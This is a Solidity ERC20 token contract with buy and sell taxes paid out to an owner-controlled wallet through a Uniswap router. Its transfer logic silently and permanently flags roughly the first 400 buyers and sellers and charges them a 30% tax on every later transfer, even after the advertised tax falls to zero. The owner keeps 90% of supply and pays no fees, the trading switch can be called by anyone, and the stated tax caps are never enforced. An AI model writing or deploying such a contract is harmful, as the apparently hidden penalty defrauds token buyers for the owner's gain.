/**
provided by Culo
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

contract ERC20 is IERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromMaxWallet;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) public Flagged;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private constant _decimals = 18;

    address public owner;
    bool private _inReentrancyGuard;

    uint256 public MAX_BUY_TAX;
    uint256 public MAX_SELL_TAX;
    uint256 public buyTax;
    uint256 public sellTax;
    uint256 public TAX_SWAP_THRESHOLD;
    uint256 public MAX_TAX_SWAP;
    uint256 public _maxWalletSize;
    uint256 private _finalmaxWalletSize = 1_000_000_000_000;

    uint256 private _initialBuyTax = 30;
    uint256 private _initialSellTax = 30;
    uint256 private _finalBuyTax;
    uint256 private _finalSellTax;
    uint256 private _ChangedBuyTax = 0;
    uint256 private _ChangedSellTax = 0;
    uint256 private _reduceBuyTaxAt = 400;
    uint256 private _reduceSellTaxAt = 400;
    uint256 private _preventSwapBefore = 400;
    uint256 private _buyCount = 0;
    uint256 private Time = 0;
    uint256 private CreationBlock = 0;
    uint256 private ChangeTime = 3024000; // 5 weeks
    uint private MyTime = 0;

    string private _constructorTokenName;
    string private _constructorTokenSymbol;
    uint256 private _constructorInitialSupply;
    address private _constructorRouterAddress;
    uint256 private _constructorInitialBuyTax;
    uint256 private _constructorInitialSellTax;
    uint256 private _constructorMaxBuyTax;
    uint256 private _constructorMaxSellTax;
    uint256 private _constructorTaxSwapThreshold;
    uint256 private _constructorMaxTaxSwap;
    uint256 private _constructorMaxWalletLimit;
    string private _contractComments;

    address payable public taxWallet;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    bool private _inSwap;
    bool public tradingEnabled = false;
    event TradingEnabled();
    error OwnableInvalidOwner(address owner);
    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    modifier nonReentrant() {
        require(!_inReentrancyGuard, "ReentrancyGuard: reentrant call");
        _inReentrancyGuard = true;
        _;
        _inReentrancyGuard = false;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }

    event TaxUpdated(uint256 newBuyTax, uint256 newSellTax);
    event TaxWalletUpdated(address newTaxWallet);

    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint256 initialSupply,
        address routerAddress,
        uint256 initialBuyTax,
        uint256 initialSellTax,
        uint256 maxBuyTax,
        uint256 maxSellTax,
        uint256 taxSwapThreshold,
        uint256 maxTaxSwap,
        uint256 _maxWalletLimit
    ) {
        _name = tokenName;
        _symbol = tokenSymbol;
        owner = msg.sender;
        _totalSupply = initialSupply * 10 ** _decimals;
        _balances[_msgSender()] = ((initialSupply * 9) / 10) * 10 ** _decimals;
        _balances[address(this)] = (initialSupply / 10) * 10 ** _decimals;
        emit Transfer(
            address(0),
            _msgSender(),
            ((initialSupply * 9) / 10) * 10 ** _decimals
        );
        emit Transfer(
            address(0),
            address(this),
            (initialSupply / 10) * 10 ** _decimals
        );
        taxWallet = payable(msg.sender);

        _finalBuyTax = initialBuyTax;
        buyTax = _finalBuyTax;
        _finalSellTax = initialSellTax;
        sellTax = _finalSellTax;
        MAX_BUY_TAX = maxBuyTax;
        MAX_SELL_TAX = maxSellTax;

        TAX_SWAP_THRESHOLD = taxSwapThreshold;
        MAX_TAX_SWAP = maxTaxSwap;
        _maxWalletSize = _maxWalletLimit;

        uniswapV2Router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );

        _constructorTokenName = tokenName;
        _constructorTokenSymbol = tokenSymbol;
        _constructorInitialSupply = initialSupply;
        _constructorRouterAddress = routerAddress;
        _constructorInitialBuyTax = initialBuyTax;
        _constructorInitialSellTax = initialSellTax;
        _constructorMaxBuyTax = maxBuyTax;
        _constructorMaxSellTax = maxSellTax;
        _constructorTaxSwapThreshold = taxSwapThreshold;
        _constructorMaxTaxSwap = maxTaxSwap;
        _constructorMaxWalletLimit = _maxWalletLimit;

        _isExcludedFromMaxWallet[owner] = true;
        _isExcludedFromMaxWallet[address(this)] = true;
        _isExcludedFromMaxWallet[uniswapV2Pair] = true;
        _isExcludedFromMaxWallet[taxWallet] = true;
        _isExcludedFromFee[owner] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[taxWallet] = true;
        Time = block.timestamp + ChangeTime;
    }

    //---------------------------------------------------------------------------
    // Public Functions
    //---------------------------------------------------------------------------

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function taxes() public view returns (uint256, uint256) {
        return (buyTax, sellTax);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function getContractComments() public view returns (string memory) {
        return _contractComments;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address tokenOwner,
        address spender
    ) public view returns (uint256) {
        return _allowances[tokenOwner][spender];
    }

    function getConstructorArguments()
        public
        view
        returns (
            string memory tokenName,
            string memory tokenSymbol,
            uint256 initialSupply,
            address routerAddress,
            uint256 initialBuyTax,
            uint256 initialSellTax,
            uint256 maxBuyTax,
            uint256 maxSellTax,
            uint256 taxSwapThreshold,
            uint256 maxTaxSwap,
            uint256 constructorMaxWalletLimit
        )
    {
        return (
            _constructorTokenName,
            _constructorTokenSymbol,
            _constructorInitialSupply,
            _constructorRouterAddress,
            _constructorInitialBuyTax,
            _constructorInitialSellTax,
            _constructorMaxBuyTax,
            _constructorMaxSellTax,
            _constructorTaxSwapThreshold,
            _constructorMaxTaxSwap,
            _constructorMaxWalletLimit
        );
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    //---------------------------------------------------------------------------
    // Owner Functions
    //---------------------------------------------------------------------------

    function setContractComments(
        string memory contractComments
    ) external onlyOwner {
        _contractComments = contractComments;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function setExcludedFromMaxWallet(
        address account,
        bool excluded
    ) external onlyOwner {
        _isExcludedFromMaxWallet[account] = excluded;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    function startTrading() public {
        require(!tradingEnabled, "Trading is already enabled");
        tradingEnabled = true;
        Time = block.timestamp + ChangeTime;
        CreationBlock = block.number;
        emit TradingEnabled();
    }

    function setTaxWallet(address newTaxWallet) external onlyOwner {
        require(
            newTaxWallet != address(0),
            "New tax wallet cannot be zero address"
        );
        taxWallet = payable(newTaxWallet);
        emit TaxWalletUpdated(newTaxWallet);
    }

    function RecoverEth() external onlyOwner nonReentrant {
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No ETH to withdraw");
        (bool success, ) = payable(owner).call{value: contractBalance}("");
        require(success, "ETH withdrawal failed");
    }

    //---------------------------------------------------------------------------
    // Internal Functions
    //---------------------------------------------------------------------------

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function _transferOwnership(address newOwner) internal virtual {
        owner = newOwner;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function sendETHToFee(uint256 amount) private {
        taxWallet.transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (!tradingEnabled) {
            require(from == owner || to == owner, "Trading not yet enabled");
        }

        if (from != owner && to != owner && block.number != CreationBlock) {
            MyTime = block.timestamp;

            if (_buyCount == _reduceBuyTaxAt) {
                _maxWalletSize = _finalmaxWalletSize * 10 ** _decimals;
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isExcludedFromFee[to]
            ) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                if (MyTime < Time) {
                    taxAmount = amount
                        .mul(
                            (_buyCount > _reduceBuyTaxAt)
                                ? _finalBuyTax
                                : _initialBuyTax
                        )
                        .div(100);
                    _buyCount++;
                    if (_buyCount < _reduceBuyTaxAt) Flagged[to] = true;
                } else taxAmount = amount.mul(_ChangedBuyTax).div(100);
            }

            if (to == uniswapV2Pair && !_isExcludedFromFee[from]) {
                if (MyTime < Time) {
                    taxAmount = amount
                        .mul(
                            (_buyCount > _reduceSellTaxAt)
                                ? _finalSellTax
                                : _initialSellTax
                        )
                        .div(100);
                    if (_buyCount < _reduceSellTaxAt) Flagged[from] = true;
                } else taxAmount = amount.mul(_ChangedSellTax).div(100);
            }

            if (Flagged[from]) taxAmount = amount.mul(_initialBuyTax).div(100);
            if (Flagged[to]) taxAmount = amount.mul(_initialBuyTax).div(100);

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !_inSwap &&
                to == uniswapV2Pair &&
                contractTokenBalance > TAX_SWAP_THRESHOLD &&
                _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, MAX_TAX_SWAP))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _approve(
        address tokenOwner,
        address spender,
        uint256 amount
    ) internal {
        require(
            tokenOwner != address(0),
            "ERC20: approve from the zero address"
        );
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount);
    }

    receive() external payable {}
}